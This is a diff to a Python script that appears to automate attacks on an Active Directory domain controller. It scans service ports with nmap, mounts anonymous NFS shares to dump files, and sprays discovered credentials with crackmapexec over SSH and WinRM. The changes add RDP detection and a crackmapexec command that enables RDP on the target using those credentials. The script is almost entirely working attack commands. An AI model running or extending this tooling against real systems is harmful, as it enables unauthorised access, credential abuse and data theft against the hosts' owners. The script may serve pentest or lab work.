@@ -260,7 +260,7 @@ ip_to_scan=re.findall(reg,ip_to_scan)[0]
 
 printf(f" scanning the Domain Controller {ip_to_scan}", green)
 
-os.system(f'nmap {ip_to_scan} -p 22,139,389,445,2049,3268,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
+os.system(f'nmap {ip_to_scan} -p 22,139,389,445,2049,3268,3389,5985 -Pn | grep open > nmap_scan.txt; nmap {ip_to_scan} -p 3389 -sC -Pn >> nmap_scan.txt')
 os.system(f'cat nmap_scan.txt | grep DNS_Domain_Name | cut -d ":" -f2 >> DC.txt')
 
 with open('DC.txt', 'r') as fichier:
@@ -302,6 +302,7 @@ smb=0
 winrm = 0
 ldap=0
 nfs=0
+rdp=0
 for item in contenu_nmap:
 	if "22/tcp" in item:
 		ssh=1
@@ -313,6 +314,8 @@ for item in contenu_nmap:
 		ldap=1
 	if "2049/tcp" in item:
 		nfs=1
+	if "3389/tcp" in item:
+		rdp=1
 
 if smb==1:
 		printf(" scanning SMB vulns ",green)
@@ -416,7 +419,7 @@ if nfs:
 
 	for anon_share in anon_shares:
 		anon_share=anon_share.replace("\n","")
-		printf(f" try to mount {ip_to_scan}://{anon_share} and dumping in /NFS",green)
+		printf(f" try to mount {ip_to_scan}://{anon_share} and dumping juicy files in /NFS",green)
 		try:
 			os.system(f"mount -t nfs {ip_to_scan}:/{anon_share} /tmp/nfs_temp_{r}")
 		except:
@@ -604,6 +607,10 @@ if len(contenu) !=0:
 
 		if ssh:
 			os.system(f'crackmapexec --timeout 2 ssh {ip_to_scan} -u {user} -p {passw}')
+
+		if rdp:
+			os.system(f'crackmapexec --timeout 2 smb {ip_to_scan} -u {user} -p {passw} -M rdp -o ACTION=enable')
+
 		if winrm:
 			os.system(f'crackmapexec --timeout 2 winrm {ip_to_scan} -u {user} -p {passw} --fail-limit 2 -d {Domain_Name}')
 		print()
